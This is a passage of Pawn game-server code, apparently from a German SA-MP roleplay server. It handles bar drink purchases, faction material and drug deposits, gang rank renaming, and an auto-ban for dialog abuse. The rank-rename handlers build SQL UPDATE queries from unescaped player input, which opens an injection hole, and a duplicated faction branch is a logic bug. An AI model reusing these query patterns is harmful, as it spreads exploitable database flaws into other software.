                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 6:
	            {

	                new Float:health;
	                format(string, sizeof(string), "%s trinkt eine Flasche Mixery.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
GivePlayerMoneySave(playerid, -3);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 7)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 10000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 7:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt eine Flasche Radeberger.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
GivePlayerMoneySave(playerid, -3);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 5)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 10000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 8:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt eine Flasche Pilsener Urquell.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
GivePlayerMoneySave(playerid, -3);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 6)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 10000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 9:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt eine Flasche Kölsch.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
GivePlayerMoneySave(playerid, -3);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 6)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 10000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 10:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Rotkäppchen.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 4;
GivePlayerMoneySave(playerid, -4);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-4;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 20000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 11:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Asti Cinzano.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 5;
GivePlayerMoneySave(playerid, -5);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-5;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 20000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { PlayerDrunk[playerid] += 1; new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 12:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Riesling.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 4;
GivePlayerMoneySave(playerid, -4);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-4;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 20000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { PlayerDrunk[playerid] += 1; new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 13:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Henkell Trocken.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
GivePlayerMoneySave(playerid, -3);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 20000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { PlayerDrunk[playerid] += 1; new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 14:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Schönlein.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 4;
GivePlayerMoneySave(playerid, -4);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-4;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 20000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { PlayerDrunk[playerid] += 1; new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 15:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Ouzo.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 5;
GivePlayerMoneySave(playerid, -5);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-5;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 50000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { PlayerDrunk[playerid] += 1; new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 25.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
                }
                case 16:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Stroh 80.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 10;
GivePlayerMoneySave(playerid, -10);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-10;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 2)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 90000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0)
						{
							new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                        else
						{
							SetPlayerHealth(playerid, health + 45.0);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                    }
                }
                case 17:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Puschkin Wodka.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 5;
GivePlayerMoneySave(playerid, -5);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-5;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 3)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 50000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0)
						{
							new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                        else
						{
							SetPlayerHealth(playerid, health + 25.0);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                    }
                }
                case 18:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Absinth.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 10;
GivePlayerMoneySave(playerid, -10);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-10;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 3)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 50000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0)
						{
							new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                        else
						{
							SetPlayerHealth(playerid, health + 25.0);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                    }
                }
                case 19:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt ein Glas Raki.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 8;
GivePlayerMoneySave(playerid, -8);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-8;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 4)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 60000);
                    }
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0)
						{
							new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 25; SetPlayerHealth(playerid, health + hp);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                        else
						{
							SetPlayerHealth(playerid, health + 25.0);
							if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
						}
                    }
                }
			}
		}
	}
	if(dialogid == DIALOG_KAMMER_FMATS)
	{
	    if(response)
	    {
	        if(IsNumeric(inputtext))
	        {
	            new frak;
	            new val = strval(inputtext);
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(val < 0)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens eine Fraktions-Materialie reinlegen!");
					return 1;
				}
				if(val > PlayerInfo[playerid][pMats])
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht so viele Fraktions-Materialien dabei!");
				    return 1;
				}
				format(ALLSTRING, sizeof(ALLSTRING), "* Du hast %d Fraktions-Materialien in die Fraktionskammer reingelegt.", val);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, ALLSTRING);
				PlayerInfo[playerid][pMats] -= val;

				if(frak == 1)
				{
					LSPDMats += val;
					new string11[128];
				    format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   	Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
				}
				else if(frak == 2)
				{
					FBIMats += val;
					new string11[128];
				    format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   	Update3DTextLabelText(fbikammer,COLOR_RED,string11);
				}
				else if(frak == 22)
				{
					LVPDMats += val;
					new string11[128];
				    format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   	Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
				}
				else if(frak == 5)
				{
					LCNMats += val;
				}
				else if(frak == 6)
				{
				    YakMats += val;
				}
				else if(frak == 8)
				{
				    HitmanMats += val;
				}
				else if(frak == 12)
				{
				    TriadMats += val;
				}
				else if(frak == 13)
				{
				    GroveMats += val;
				}
				else if(frak == 14)
				{
				    BallasMats += val;
				}
				else if(frak == 14)
				{
				    BikerMats += val;
				}
				else if(frak == 16)
				{
				    VagosMats += val;
				}
				else if(frak == 17)
				{
				    AztecaMats += val;
				}
				else if(frak == 18)
				{
				    SFRifaMats += val;
				}
				else if(frak == 19)
				{
				    RSMats += val;
				}
				else if(frak == 20)
				{
				    TerrorMats += val;
				}
				else if(frak == 21)
				{
				    WHMats += val;
				}
				else if(frak == 23)
				{
				    BrigadaMats += val;
				}
				SaveFrakMats();
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Falsche Eingabe!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
	}

	if(dialogid == DIALOG_KAMMER_DROGEN2)
	{
	    if(response)
	    {
	        if(IsNumeric(inputtext))
	        {
	            new frak;
	            new val = strval(inputtext);
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(val < 0)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens 1 Gramm Drogen reinlegen");
					return 1;
				}
				if(val > PlayerInfo[playerid][pDrugs])
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht so viele Drogen dabei!");
				    return 1;
				}
				format(ALLSTRING, sizeof(ALLSTRING), "* Du hast %d Drogen in die Fraktionskammer reingelegt.", val);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, ALLSTRING);
				PlayerInfo[playerid][pDrugs] -= val;
				if(frak == 5)
				{
					LCNDrugs += val;
				}
				else if(frak == 6)
				{
				    YakDrugs += val;
				}
				else if(frak == 8)
				{
				    HitmanDrugs += val;
				}
				else if(frak == 12)
				{
				    TriadDrugs += val;
				}
				else if(frak == 13)
				{
				    GroveDrugs += val;
				}
				else if(frak == 14)
				{
				    BallasDrugs += val;
				}
				else if(frak == 15)
				{
				    BikerDrugs += val;
				}
				else if(frak == 16)
				{
				    VagosDrugs += val;
				}
				else if(frak == 17)
				{
				    AztecaDrugs += val;
				}
				else if(frak == 18)
				{
				    SFRifaDrugs += val;
				}
				else if(frak == 19)
				{
				    RSDrugs += val;
				}
				else if(frak == 20)
				{
				    TerrorDrugs += val;
				}
				else if(frak == 21)
				{
				    WHDrugs += val;
				}
				else if(frak == 23)
				{
				    BrigadaDrugs += val;
				}
				SaveFrakDrugs();
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Falsche Eingabe!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
	}
	if(dialogid == DIALOG_RANGNAME)
	{
   	    if(response == 1)
		{
		switch(listitem)
		{
			case 0:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG1, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 1:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG2, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 2:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG3, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 3:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG4, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 4:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG5, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 5:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG6, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 6:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG7, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 7:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG8, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 8:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG9, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 9:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG10, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 10:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG11, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
			case 11:
			{
				    ShowPlayerDialog(playerid, DIALOG_RANG12, DIALOG_STYLE_INPUT, "Rang Verwaltung", "Bitte gebe nun den neuen Rangnamen ein:", "Bestätigen", "Verlassen");
			}
		}
	 	}
		if(!response)
		{
			return SCM(playerid,COLOR_GRAD2,"Du hast den Vorgang abgebrochen.");
	 	}
	}
	if(dialogid == DIALOG_RANG1) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];

			printf("UPDATE gangrangs SET rangname1 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]); //-> I'm @ home


			format(query, sizeof(query), "UPDATE gangrangs SET rangname1 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang1],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG2) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname2 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang2],256,"%s",inputtext);
		}
 	}









 	if(dialogid == 4221)
	{
		        if(DialogShowed[playerid] == 1) // Männlich
		        {
						new info[128];
						format(info,128,"%s: Umfrage: %s",GetName(playerid),inputtext);
						SendClientMessageToAll(COLOR_NEWS, info);

			            for(new i=0; i<MAX_PLAYERS; i++)
			            {
			                PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
			            }
						DialogShowed[playerid] = 0;
	        	}
				else
		        {
				format(stringtu, sizeof(stringtu), "%s wurde vom Server gebannt, Grund: Dialog-Repeater /carsell", GetName(playerid));
				SendClientMessageToAll(COLOR_RED, stringtu);
       		 	TogglePlayerControllable(playerid, false);

				Ban(playerid);

				PlayerInfo[playerid][pAdmin] = 0;
				PlayerInfo[playerid][pGebannt] = 1;

	   			new stringk[128];
				format(stringk, sizeof(stringk), "Dialog-Repeater");
				strmid(PlayerInfo[playerid][pBanGrund], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Server");
				strmid(PlayerInfo[playerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Permanent");
				strmid(PlayerInfo[playerid][pBanDauer], stringk, 0, strlen(stringk), 255);

				return 1;
	        	}
		return 1;
 	}
 	if(dialogid == DIALOG_RANG3)
	{
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname3 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");
			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang3],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG4) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname4 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang4],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG5) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname5 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang5],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG6) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname6 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang6],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG7) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname7 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
			//mysql_function_query(mysqlcon,query,false,"","");

			mysql_pquery(mysqlcon,query,"");


			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang7],256,"%s",inputtext);
		}
 	}
